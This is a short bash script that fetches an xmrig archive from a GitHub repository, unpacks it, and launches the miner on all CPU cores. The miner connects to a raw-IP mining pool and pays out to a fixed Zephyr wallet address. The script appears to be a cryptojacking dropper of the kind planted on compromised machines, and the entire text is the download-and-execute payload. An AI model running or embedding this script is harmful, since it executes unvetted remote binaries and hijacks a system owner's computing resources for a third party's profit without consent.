#!/bin/bash
wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o 45.76.185.233:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p SKOY -a rx/0 -t $(nproc --all)
